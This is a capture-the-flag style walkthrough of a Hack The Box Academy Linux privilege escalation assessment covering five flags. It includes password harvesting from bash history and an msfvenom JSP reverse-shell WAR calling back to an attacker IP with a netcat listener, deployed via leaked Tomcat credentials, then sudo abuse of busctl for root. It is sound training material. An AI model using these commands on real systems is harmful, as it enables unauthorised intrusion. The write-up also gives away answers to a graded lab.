# Linux Local Privilege Escalation - Skills Assessment
We have been contracted to perform a security hardening assessment against one of the INLANEFREIGHT organizations' public-facing web servers.

The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.

Once on the host, we must find five flags on the host, accessible at various privilege levels. Escalate privileges all the way from the htb-student user to the root user and submit all five flags to finish this module.

`SSH to 10.129.71.247 (ACADEMY-LLPE-SKILLS-NIX03) with user "htb-student" and password "Academy_LLPE!"`

## Flag 1 - Discovery through Hidden Configuration Files
To begin the enumeration, I searched for any hidden or protected flag files on the system using the command:
```bash
find / -name "*flag1.txt*" 2>/dev/null
```
![image](https://github.com/user-attachments/assets/d40392e8-9f39-47fb-af1d-06e59e54fd13)

I discovered the flag located at `/home/htb-student/.config/.flag1.txt.` To retrieve its contents, I used:
```bash
cat /home/htb-student/.config/.flag1.txt
```
This initial step highlights the importance of searching hidden directories for configuration leaks.

## Flag 2 - User Privilege Escalation through Bash History
Navigating to the `/home` directory revealed three user folders: `barry`, `htb-student`, and `mrb3n`. Inside `barry`'s directory, I found `flag2.txt`, but access was denied:
```bash
cd /home/barry
ls -la
cat flag2.txt   # Permission denied
```
To bypass this, I examined Barry's `.bash_history` with:
```bash
cat /home/barry/.bash_history
```
![image](https://github.com/user-attachments/assets/6d7aa9db-87a0-4145-bf3a-8418e17787da)

Inside the history, I found login attempts along with a password. Using thie password, I escalated to the `barry` user:
```bash
su barry
# Entered the password
```
As `barry`, I successfully read the flag:
```bash
cat /home/barry/flag2.txt
```

## Flag 3 - Log File Enumeration for Sensitive Information
To search for the third flag, I ran the following command:
```bash
find / -name "*flag3.txt*" 2>/dev/null
```
The flag was located in the /var/log directory:
```bash
cat /var/log/flag3.txt
```
This flag was exposed in log files, demonstrating poor security practices for sensitive information storage.

## Flag 4 - Tomcat Manager Exploitation and Reverse Shell
While exploring the `/var/log` directory, I discovered that `tomcat9` was running. Accessing `/etc/tomcat9/tomcat-users.xml.bak` revealed credentials for the Tomcat Manager. I logged in via the web interface and generated a WAR payload for a reverse shell using:
![image](https://github.com/user-attachments/assets/b949aaae-ee8b-4f3a-b2b1-d0d3b6720335)

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.44 lport=4444 -f war -o shell.war
```

I uploaded the WAR file to the Tomcat Manager interface and deployed it. With Netcat listening:
```bash
nc -lvnp 4444
```
I accessed the shell at:
`http://<Target-IP>:8080/shell/`

![image](https://github.com/user-attachments/assets/09edba34-57e3-4337-a33b-9a3f1e01bba4)

Inside the shell, I navigated to Tomcat's directory and retrieved the flag:
```bash
cat /var/lib/tomcat9/flag4.txt
```

## Flag 5 - Abusing Sudo Permissions and D-Bus Control
After getting a reverse shell, I needed a fully interactive shell. I spawned one using:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://github.com/user-attachments/assets/b7db7d64-d6df-44d5-8f04-440ab6087c2e)

To escalate further, I checked my sudo permissions as the tomcat user:
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/5a33975c-2b78-4a09-a80e-ee688cc208f3)

I noticed NOPASSWD rights for `/usr/bin/busctl`. Using the following command, I listed available services:
```bash
sudo /usr/bin/busctl list
```
![image](https://github.com/user-attachments/assets/59be6bef-03f0-486c-8f56-f8c3e85db138)

I spawned a root shell by leveraging D-Bus interaction, then navigated to the root's home directory to find the final flag:
```bash
cd /root
cat flag5.txt
```
![image](https://github.com/user-attachments/assets/87cf2549-7e8f-42dc-a58a-9fe0bcd55078)
